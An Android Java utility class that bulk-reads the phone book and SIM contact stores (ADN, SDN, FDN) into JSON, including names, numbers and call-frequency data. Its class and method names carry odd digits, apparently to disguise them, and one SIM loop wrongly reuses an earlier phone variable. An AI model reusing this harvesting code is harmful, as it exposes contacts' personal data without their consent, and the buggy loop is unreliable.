package cdax.naindex;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.text.TextUtils;


import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

import cdax.naindex.datalib.DataUtil;
import cdax.naindex.datalib.data.Contact;


public class Cont1actArgentUtil {

    public static String name;

    public static String name12;
    public static String phoneNum12;
    public static String contact_last_updated_timestamp12;
    public static String last_time_contacted12;
    public static String times_contacted12;
    public static String phoneNum;
    public static String contact_last_updated_timestamp;
    public static String last_time_contacted;
    public static String times_contacted;

    public static String name1;
    public static String phoneNum1;
    public static String contact_last_updated_timestamp1;
    public static String last_time_contacted1;
    public static String times_contacted1;


    public static JSONArray getQuickCo7ntac8tsInfo(Context context) {
        List<Contact> list = getContacts(context);
        JSONArray contacts = new JSONArray();
        if (list != null && !list.isEmpty()) {

            for (Contact item : list) {
                JSONObject contact = new JSONObject();
                try {
                    contact.put("contact_display_name", DataUtil.filterText(item.getContact_display_name()));
                    contact.put("number", DataUtil.filterText(item.getNumber()));
                    contact.put("times_contacted", item.getTimes_contacted());
                    contact.put("last_time_contacted", item.getLast_time_contacted());
                    contact.put("up_time", item.getUp_time());
                    contacts.put(contact);
                } catch (Exception var7) {
                }
            }
        }

        return contacts;
    }

    @SuppressLint("Range")
    public static ArrayList<Contact> getContacts(Context context) {
        ArrayList<Contact> list = new ArrayList<Contact>();
        Cursor cursor = null;

        try {
            Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            String[] projection = new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP, ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED, ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED};
            ContentResolver resolver = context.getContentResolver();
            cursor = resolver.query(uri, projection, null, null, null);
            int index = 0;
            if (cursor != null) {
                while (cursor.moveToNext()) {

                    if (cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME) == -1) {
                        continue;
                    }
                    if (cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER) == -1) {
                        continue;
                    }
                    name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    phoneNum = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contact_last_updated_timestamp = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP));
                    last_time_contacted = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED));
                    times_contacted = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED));

                    index++;
                    if (TextUtils.isEmpty(phoneNum))
                        continue;

                    //字符转换为字符数组d
                    String phone = String.valueOf(phoneNum.trim().replace(" ", ""));
                    //添加到对象
                    Contact man = new Contact();
                    man.setContact_display_name(DataUtil.filterText(name));
                    man.setNumber(DataUtil.filterText(phone));
                    man.setLast_time_contacted(last_time_contacted);
                    man.setUp_time(contact_last_updated_timestamp);
                    man.setTimes_contacted(times_contacted);
                    list.add(man);
                }
            }

            uri = Uri.parse("content://icc/adn");
            cursor = context.getContentResolver().query(uri, projection, null, null, null);
            index = 0;
            if (cursor != null) {
                while (cursor.moveToNext()) {

                    if (cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME) == -1) {
                        continue;
                    }
                    if (cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER) == -1) {
                        continue;
                    }
                    name1 = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    phoneNum1 = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contact_last_updated_timestamp1 = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP));
                    last_time_contacted1 = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED));
                    times_contacted1 = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED));

                    index++;
                    if (TextUtils.isEmpty(phoneNum1))
                        continue;
                    //字符转换为字符数组d
                    String phone1 = String.valueOf(phoneNum.trim().replace(" ", ""));
                    //添加到对象
                    Contact man = new Contact();
                    man.setContact_display_name(DataUtil.filterText(name1));
                    man.setNumber(DataUtil.filterText(phone1));
                    man.setLast_time_contacted(last_time_contacted1);
                    man.setUp_time(contact_last_updated_timestamp1);
                    man.setTimes_contacted(times_contacted1);
                    list.add(man);
                }
            }


            try {
//                getSimContact("content://icc/adn", context, list);
                getSimContactV2("content://icc/adn/subId/#", context, list);
                getSimContactV2("content://icc/sdn", context, list);
                getSimContactV2("content://icc/sdn/subId/#", context, list);
                getSimContactV2("content://icc/fdn", context, list);
                getSimContactV2("content://icc/fdn/subId/#", context, list);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } catch (Exception e) {

        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return list;
    }


    @SuppressLint("Range")
    private static void getSimContactV2(final String adn, Context context, ArrayList<Contact> list) {
        // 读取SIM卡手机号,有三种可能:content://icc/adn || content://icc/sdn || content://icc/fdn
        // 具体查看类 IccProvider.java

        String[] projection = new String[]{
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP, ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED, ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED};
        Cursor cursor = null;
        try {
            Uri uri = Uri.parse(adn);
            cursor = context.getContentResolver().query(uri, projection,
                    null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    if (cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME) == -1) {
                        continue;
                    }
                    if (cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER) == -1) {
                        continue;
                    }
                    name12 = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    phoneNum12 = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contact_last_updated_timestamp12 = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP));
                    last_time_contacted12 = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED));
                    times_contacted12 = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED));

//                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
//                    String phoneNum = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
//                    String contact_last_updated_timestamp = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP));
//                    String last_time_contacted = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED));
//                    String times_contacted = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED));
                    if (TextUtils.isEmpty(phoneNum12))
                        continue;
                    //字符转换为字符数组d
                    String phone12 = String.valueOf(phoneNum12.trim().replace(" ", ""));
                    //添加到对象
                    Contact man = new Contact();
                    man.setContact_display_name(DataUtil.filterText(name12));
                    man.setNumber(DataUtil.filterText(phone12));
                    man.setLast_time_contacted(last_time_contacted12);
                    man.setUp_time(contact_last_updated_timestamp12);
                    man.setTimes_contacted(times_contacted12);
                    list.add(man);
                }
                cursor.close();
            }
        } catch (Exception e) {
            if (cursor != null) {
                cursor.close();
            }
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

}
